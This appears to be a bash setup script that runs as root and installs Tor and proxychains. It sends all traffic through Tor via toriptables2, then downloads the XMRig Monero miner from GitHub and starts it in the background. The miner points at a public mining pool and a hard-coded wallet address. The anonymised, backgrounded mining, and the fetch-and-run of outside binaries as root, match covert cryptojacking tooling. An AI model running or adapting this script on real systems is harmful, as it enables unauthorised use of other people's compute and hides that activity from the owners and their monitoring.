#!/bin/bash
sudo -i
sudo apt-get update
sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev uuid-dev tor proxychains tar wget python
git clone https://github.com/ruped24/toriptables2.git
wget https://github.com/xmrig/xmrig/releases/download/v6.2.0-beta/xmrig-6.2.0-beta-xenial-x64.tar.gz
cd toriptables2/
sudo mv toriptables2.py /usr/local/bin/
cd
tar --extract --file xmrig-6.2.0-beta-xenial-x64.tar.gz
sudo sysctl -w vm.nr_hugepages=128
sudo systemctl start tor
sudo toriptables2.py -l

cd xmrig-6.2.0-beta
proxychains torify ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o pool.supportxmr.com:9000 -u 8Bchi3J8r4C1nSwB1wW4AFjkvr9FaQKpj2mMWxiDNgkTRBragUrY1Nv4NoYWrurX3B9zXYCS4wY59iqXTqvtKg6DKSQY4Tg -p x -a cn/r -x 9150 -t 8 -k --tls -B --background
